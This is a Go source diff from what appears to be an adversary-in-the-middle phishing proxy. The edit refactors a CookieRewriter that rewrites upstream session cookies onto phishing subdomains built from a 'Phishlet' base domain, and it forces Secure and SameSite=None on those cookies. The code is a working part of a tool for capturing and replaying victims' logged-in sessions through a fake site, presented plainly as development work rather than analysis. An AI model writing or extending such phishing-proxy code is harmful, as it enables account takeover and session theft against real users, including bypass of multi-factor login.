@@ -19,8 +19,8 @@ func (h *CookieRewriter) Handle(ctx *aitm.ProxyContext, resp *http.Response) err
 	resp.Header.Del("Set-Cookie")
 
 	for _, cookie := range cookies {
-		if ctx.Phishlet != nil && ctx.Deployment != nil && cookie.Domain != "" {
-			cookie.Domain = rewriteCookieDomain(cookie.Domain, ctx.Phishlet, ctx.Deployment)
+		if ctx.Phishlet != nil && cookie.Domain != "" {
+			cookie.Domain = rewriteCookieDomain(cookie.Domain, ctx.Phishlet)
 		}
 		cookie.Secure = true
 		cookie.SameSite = http.SameSiteNoneMode
@@ -41,11 +41,11 @@ func (h *CookieRewriter) Handle(ctx *aitm.ProxyContext, resp *http.Response) err
 	return nil
 }
 
-func rewriteCookieDomain(upstreamDomain string, def *aitm.PhishletDef, deployment *aitm.PhishletDeployment) string {
+func rewriteCookieDomain(upstreamDomain string, p *aitm.Phishlet) string {
 	cleanDomain := strings.TrimPrefix(strings.ToLower(upstreamDomain), ".")
-	for _, proxyHost := range def.ProxyHosts {
+	for _, proxyHost := range p.ProxyHosts {
 		if strings.HasSuffix(cleanDomain, strings.ToLower(proxyHost.Domain)) {
-			return proxyHost.PhishSubdomain + "." + deployment.BaseDomain
+			return proxyHost.PhishSubdomain + "." + p.BaseDomain
 		}
 	}
 	return upstreamDomain
